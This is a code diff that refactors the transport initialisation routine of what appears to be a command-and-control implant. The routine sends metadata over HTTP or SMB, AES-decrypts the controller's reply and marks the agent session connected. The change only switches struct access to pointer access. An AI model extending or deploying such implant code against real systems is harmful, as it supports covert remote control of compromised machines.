@@ -19,19 +19,19 @@ BOOL TransportInit( )
 
     /* Sends to our connection (direct/pivot) */
 #ifdef TRANSPORT_HTTP
-    if ( PackageTransmitNow( Instance.MetaData, &Data, &Size ) )
+    if ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
     {
         AESCTX AesCtx = { 0 };
 
         /* Decrypt what we got */
-        AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
+        AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
         AesXCryptBuffer( &AesCtx, Data, Size );
 
         if ( Data )
         {
-            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
+            if ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
             {
-                Instance.Session.Connected = TRUE;
+                Instance->Session.Connected = TRUE;
                 Success = TRUE;
             }
         }
@@ -39,9 +39,9 @@ BOOL TransportInit( )
 #endif
 
 #ifdef TRANSPORT_SMB
-    if ( PackageTransmitNow( Instance.MetaData, NULL, NULL ) == TRUE )
+    if ( PackageTransmitNow( Instance->MetaData, NULL, NULL ) == TRUE )
     {
-        Instance.Session.Connected = TRUE;
+        Instance->Session.Connected = TRUE;
         Success = TRUE;
     }
 #endif
